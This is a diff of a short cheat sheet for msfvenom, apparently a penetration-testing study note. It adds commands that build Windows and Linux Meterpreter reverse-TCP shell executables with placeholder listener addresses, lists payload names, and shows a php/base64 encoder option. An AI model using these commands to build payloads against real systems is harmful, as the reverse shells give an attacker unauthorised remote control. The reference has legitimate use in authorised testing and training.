@@ -1,16 +1,25 @@
 Usage:
-  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f exe > rev_shell.exe
+  msfvenom -p <OS>/<ARCH>/<PAYLOAD> LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f exe -o rev_shell.exe
+Example Usage:
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f exe -o rev_shell.exe
 
 Options:
-  -p      Payload
-  -f      Format
-  -e      Encoder
-  LHOST   Local host
-  LPORT   Local port (Listening port)
+  -p payload
+  -f format
+  -e encoder
+  -o output-file
+  LHOST=<LOCAL_IP>
+  LPORT=<LOCAL_PORT> (listening port)
+
+Payload formats:
+  windows/x64/meterpreter/reverse_tcp
+                            Windows 64bit staged Meterpreter payload
+  linux/x86/meterpreter_reverse_tcp
+                            Linux 32bit stageless Meterpreter payload
 
 Commands:
   msfvenom -l payloads      Show all payloads available
-  msfvenom -l payloads | rg meterpreter   Show all payloads available for meterpreter
+  msfvenom -l payloads | grep meterpreter   Show all payloads available for meterpreter
   msfvenom --list formats   List supported output formats. You can either generate stand-alone payloads 
                             (Windows executable for Meterpreter) or get a usable raw format (e.g. python)
   msfvenom -f raw -e php/base64
